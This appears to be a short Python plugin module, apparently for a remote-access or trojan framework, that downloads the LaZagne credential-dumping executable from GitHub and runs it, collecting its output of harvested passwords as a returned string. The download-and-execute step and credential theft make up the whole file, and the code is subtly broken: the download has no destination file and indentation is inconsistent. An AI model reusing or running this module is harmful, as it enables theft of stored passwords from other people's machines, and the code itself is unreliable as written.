import urllib
import os
def run(**args):
	urllib.urlretrieve ("https://github.com/AlessandroZ/LaZagne/blob/master/Windows/standalone/laZagne.exe?raw=true")
	handle = os.popen("LaZagne.exe")
        line = " "
        output = "LaZagne: "
        while line:
                line = handle.read()
                output = (output + line)
        handle.close()
        return output
